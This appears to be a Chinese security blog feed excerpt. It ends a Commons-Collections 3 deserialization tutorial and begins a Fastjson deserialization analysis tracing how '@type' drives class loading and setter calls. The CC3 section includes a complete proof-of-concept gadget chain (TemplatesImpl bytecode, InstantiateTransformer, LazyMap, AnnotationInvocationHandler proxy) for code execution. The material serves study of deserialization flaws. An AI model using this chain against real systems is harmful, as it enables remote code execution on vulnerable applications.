<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而且缺少了<strong>InvokerTransformer</strong>，<strong>TrAXFilter</strong>的构造⽅法也是⽆法调⽤的</p>
<p>所以<strong>ysoserial</strong>找到了一个新的<strong>Transformer</strong></p>
<h2 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h2><p>这里<strong>ysoserial</strong>就找到了<strong>InstantiateTransformer</strong>这个类，并且也是实现了<strong>Transformer</strong>接⼝的类</p>
<p>可以看到，在它的<strong>transform</strong>方法中</p>
<p>当传入的是<strong>Class</strong>时，会获取它的构造器，然后调用它的构造函数进行实例化</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(</span><br><span class="line">                <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span></span><br><span class="line">                    + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class) input).getConstructor(iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> con.newInstance(iArgs);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>所以我们可以将代码改成</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;);</span></span><br><span class="line"><span class="comment">//instantiateTransformer.transform(TrAXFilter.class);</span></span><br><span class="line"></span><br><span class="line">Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="comment">//反射修改属性</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">nameFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">nameFiled.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取字节码</span></span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\tmp\\classes\\CalcTest.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesFiled.set(templates,codes);</span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryFiled.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, h);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Override.class, mapProxy);</span><br><span class="line">serialize(o);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/15/Java%E5%AE%89%E5%85%A8/CommonsCollection3%E5%88%A9%E7%94%A8%E9%93%BE/image-20231019195732198.png"
                      class="" title="image-20231019195732198"
                >

<h1 id="0x04-参考资料"><a href="#0x04-参考资料" class="headerlink" title="0x04 参考资料"></a>0x04 参考资料</h1><p>P牛知识星球-Java安全漫谈</p>
<p>B站-白日梦组长</p>
<p><a class="link"   href="https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.999.0.0&vd_source=19d2e433219440bcf5304fbe8a00b7ff" >https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.999.0.0&amp;vd_source=19d2e433219440bcf5304fbe8a00b7ff <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>Y4tacker</p>
<p><a class="link"   href="https://github.com/Y4tacker/JavaSec" >https://github.com/Y4tacker/JavaSec <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>CommonsCollections3</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson反序列化(一)</title>
    <url>/2023/10/03/Java%E5%AE%89%E5%85%A8/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(%E4%B8%80)/</url>
    <content><![CDATA[<h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p><strong>Fastjson</strong>是一款由阿里巴巴公司开发的<strong>Java</strong>语言编写的高性能<strong>JSON</strong>解析库。它采用了特殊的算法和数据结构，可以快速地将<strong>JSON</strong>格式的字符串解析为<strong>Java</strong>对象，或将<strong>Java</strong>对象序列化为<strong>JSON</strong>字符串</p>
<p><strong>Fastjson</strong>提供了两个主要接口来分别实现对于<strong>Java Object</strong>的序列化和反序列化操作。</p>
<ul>
<li><code>JSON.toJSONString</code></li>
<li><code>JSON.parseObject/JSON.parse</code></li>
</ul>
<h1 id="0x01-简单使用"><a href="#0x01-简单使用" class="headerlink" title="0x01 简单使用"></a>0x01 简单使用</h1><ul>
<li><strong>person.java</strong></li>
</ul>
<p>这是一个简单的<strong>JavaBean</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><ul>
<li><strong>JSON.toJSONString(person)</strong></li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FJTest01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.setName(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        person.setAge(<span class="number">6</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(person);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果</span></span><br><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">setAge</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="number">6</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;hello&quot;</span>&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>JSON.toJSONString(person,SerializerFeature.WriteClassName)</strong></li>
</ul>
<p>是<strong>Fastjson</strong>序列化时的一个配置选项，用于设置是否在序列化过程中写入类名。</p>
<p>在默认情况下，<strong>Fastjson</strong>序列化对象是不会写入类名的</p>
<p>如果添加了第二个参数<strong>SerializerFeature.WriteClassName</strong>，<strong>Fastjson</strong>会在序列化对象时会多出一个**@type<strong>，即写入被序列化的对象的类名信息。这样在反序列化时，</strong>Fastjson<strong>会自动根据类名信息绑定正确的</strong>Java**类型，从而简化了反序列化的操作。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FJTest01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.setName(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        person.setAge(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString1</span> <span class="operator">=</span> JSON.toJSONString(person, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(jsonString1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果</span></span><br><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">setAge</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.example.Person&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">6</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;hello&quot;</span>&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><ul>
<li><strong>JSON.<em>parse</em>(String text)</strong></li>
</ul>
<p>解析为JSONObject类型或者JSONArray类型</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FJTest02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonstring</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Person\&quot;,\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;hello\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">parse</span> <span class="operator">=</span> JSON.parse(jsonstring);</span><br><span class="line">        System.out.println(parse);</span><br><span class="line">        System.out.println(parse.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果</span></span><br><span class="line">构造函数</span><br><span class="line">setAge</span><br><span class="line">setName</span><br><span class="line">org.example.Person@4459eb14</span><br><span class="line">org.example.Person</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>JSON.<em>parseObject</em>(String text)</strong></li>
</ul>
<p><strong>JSON</strong>文本解析成<strong>JSONObject</strong>类型</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FJTest02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonstring</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Person\&quot;,\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;hello\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(jsonstring);</span><br><span class="line">        System.out.println(jsonObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果</span></span><br><span class="line">构造函数</span><br><span class="line">setAge</span><br><span class="line">setName</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">6</span>&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>*<em>JSON.<em>parseObject</em>parseObject(String text, Class<T> clazz)</em>*</li>
</ul>
<p><strong>JSON</strong>文本解析成对应的**.class**</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FJTest02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonstring</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Person\&quot;,\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;hello\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> JSON.parseObject(jsonstring, Person.class);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        System.out.println(person.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果</span></span><br><span class="line">构造函数</span><br><span class="line">setAge</span><br><span class="line">setName</span><br><span class="line">org.example.Person@4459eb14</span><br><span class="line">org.example.Person</span><br></pre></td></tr></table></figure></div>

<h1 id="0x02-流程分析"><a href="#0x02-流程分析" class="headerlink" title="0x02 流程分析"></a>0x02 流程分析</h1><h2 id="反序列化-1"><a href="#反序列化-1" class="headerlink" title="反序列化"></a>反序列化</h2><p>断点位置</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(jsonstring);</span><br></pre></td></tr></table></figure></div>

<p>首先会到<strong>parseObject</strong>里面，去调用<strong>parse</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title function_">parseObject</span><span class="params">(String text)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> parse(text);</span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> JSONObject) &#123;</span><br><span class="line">        <span class="keyword">return</span> (JSONObject) obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (JSONObject) JSON.toJSON(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>一路走到<strong>parse</strong>，创建了个<strong>DefaultJSONParser</strong>对象</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">parse</span><span class="params">(String text, <span class="type">int</span> features)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (text == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">DefaultJSONParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultJSONParser</span>(text, ParserConfig.getGlobalInstance(), features);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> parser.parse();</span><br><span class="line">    parser.handleResovleTask(value);</span><br><span class="line">    parser.close();</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在<strong>parse</strong>中的<strong>DefaultJSONParser</strong>，会在该方法中盘断<strong>json</strong>字符串是否以**{<strong>或</strong>[**开头，然后分配不同的解析流程，以其他字符开头的后面的解析过程中会报错</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">DefaultJSONParser</span><span class="params">(<span class="keyword">final</span> Object input, <span class="keyword">final</span> JSONLexer lexer, <span class="keyword">final</span> ParserConfig config)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.lexer = lexer;</span><br><span class="line">    <span class="built_in">this</span>.input = input;</span><br><span class="line">    <span class="built_in">this</span>.config = config;</span><br><span class="line">    <span class="built_in">this</span>.symbolTable = config.symbolTable;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ch</span> <span class="operator">=</span> lexer.getCurrent();</span><br><span class="line">    <span class="keyword">if</span> (ch == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">        lexer.next();</span><br><span class="line">        ((JSONLexerBase) lexer).token = JSONToken.LBRACE;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">        lexer.next();</span><br><span class="line">        ((JSONLexerBase) lexer).token = JSONToken.LBRACKET;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        lexer.nextToken(); <span class="comment">// prime the pump</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>比较重要的是<strong>parse</strong>中调用的<strong>parse</strong>方法，在<strong>parse</strong>里面会先创建一个空的<strong>JSONObject</strong></p>
<p>然后再调用<strong>parseObject</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">parse</span><span class="params">(Object fieldName)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">JSONLexer</span> <span class="variable">lexer</span> <span class="operator">=</span> <span class="built_in">this</span>.lexer;</span><br><span class="line">    <span class="keyword">switch</span> (lexer.token()) &#123;</span><br><span class="line">    	<span class="comment">//省略部分代码......</span></span><br><span class="line">        <span class="keyword">case</span> LBRACE:</span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>(lexer.isEnabled(Feature.OrderedField));</span><br><span class="line">            <span class="keyword">return</span> parseObject(object, fieldName);</span><br><span class="line">        <span class="comment">//省略部分代码......</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在<strong>parseObject</strong>会先去获取<strong>key</strong>，也就是**@type**，会对其对应的值进行类加载操作</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">parseObject</span><span class="params">(<span class="keyword">final</span> Map object, Object fieldName)</span> &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">setContextFlag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            <span class="comment">//省略部分代码......</span></span><br><span class="line">            Object key;</span><br><span class="line">            <span class="keyword">if</span> (ch == <span class="string">&#x27;&quot;&#x27;</span>) &#123;</span><br><span class="line">                key = lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">                lexer.skipWhitespace();</span><br><span class="line">                ch = lexer.getCurrent();</span><br><span class="line">                <span class="keyword">if</span> (ch != <span class="string">&#x27;:&#x27;</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;expect &#x27;:&#x27; at &quot;</span> + lexer.pos() + <span class="string">&quot;, name &quot;</span> + key);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="comment">//省略部分代码......</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.setContext(context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果匹配到**@Type<strong>，首先会利用</strong>TypeUtils.loadClass**去加载这个类</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">parseObject</span><span class="params">(<span class="keyword">final</span> Map object, Object fieldName)</span> &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">setContextFlag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            <span class="comment">//省略部分代码......</span></span><br><span class="line">            <span class="keyword">if</span> (key ==JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">                Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());</span><br><span class="line">                </span><br><span class="line">                <span class="comment">//省略部分代码......</span></span><br><span class="line">                <span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> config.getDeserializer(clazz);</span><br><span class="line">                <span class="keyword">return</span> deserializer.deserialze(<span class="built_in">this</span>, clazz, fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//省略部分代码......</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.setContext(context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>主要是来看一下<strong>getDeserializer</strong>，经过一系列的调用</p>
<p><strong>getDeserializer#createJavaBeanDeserializer -&gt; createJavaBeanDeserializer#JavaBeanInfo.build</strong></p>
<p>创建了个<strong>derializer</strong></p>
<p>跟进到<strong>bulid</strong>方法中，最主要的是后面的几个<strong>for</strong>方法</p>
<p>其作用是构建<strong>JavaBeanInfo</strong>对象，用于描述<strong>Java</strong>类的结构信息，包括字段、方法、构造函数等。</p>
<p>在<strong>setter</strong>的循环中，如果添加到<strong>fieldList</strong>后，同时符合的<strong>getter</strong>也不会存进去</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JavaBeanInfo <span class="title function_">build</span><span class="params">(Class&lt;?&gt; clazz, Type type, PropertyNamingStrategy propertyNamingStrategy)</span> &#123;</span><br><span class="line">    <span class="comment">//代码太多了，省略掉......</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// setter methods</span></span><br><span class="line">    <span class="keyword">for</span> (Method method : methods) </span><br><span class="line">    <span class="comment">// public static fields</span></span><br><span class="line">    <span class="keyword">for</span> (Field field : clazz.getFields()) </span><br><span class="line">    <span class="comment">// getter methods</span></span><br><span class="line">    <span class="keyword">for</span> (Method method : clazz.getMethods()) </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JavaBeanInfo</span>(clazz, builderClass, defaultConstructor, <span class="literal">null</span>, <span class="literal">null</span>, buildMethod, jsonType, fieldList);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结一下<strong>setter</strong>、<strong>getter</strong>需要符合的条件有哪些</p>
<ul>
<li><strong>setter</strong></li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">长度大于4</span><br><span class="line">非静态函数</span><br><span class="line">返回类型为void或当前类</span><br><span class="line">参数个数为1个</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>getter</strong></li>
</ul>
